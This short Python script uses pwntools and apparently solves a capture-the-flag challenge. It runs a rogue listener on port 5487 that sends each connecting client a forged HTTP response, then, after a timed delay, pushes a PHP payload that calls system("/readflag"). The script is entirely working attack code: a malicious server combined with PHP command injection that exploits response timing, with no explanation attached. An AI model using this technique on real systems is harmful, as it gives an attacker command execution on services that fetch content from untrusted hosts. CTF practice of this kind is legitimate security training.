from pwn import * 
import time 
import threading
# r = remote("localhost", 5487) 
for _ in range(100): 
    l = listen(5487) 
    c = l.wait_for_connection() 

    resp = '''HTTP/1.1 200 OK
    Date: Sun, 29 Dec 2019 05:22:47 GMT
    Server: Apache/2.4.18 (Ubuntu)
    Vary: Accept-Encoding
    Content-Length: 8
    Content-Type: text/html; charset=UTF-8

    AAA
    BBB'''.replace("\n","\r\n")
    c.send(resp)

    def job():
        time.sleep(0.26)
        phpcode = 'wtf<?php system("/readflag");?>';
        c.send(phpcode)

    t = threading.Thread(target = job)
    t.start()

    l.close() 
    t.join() 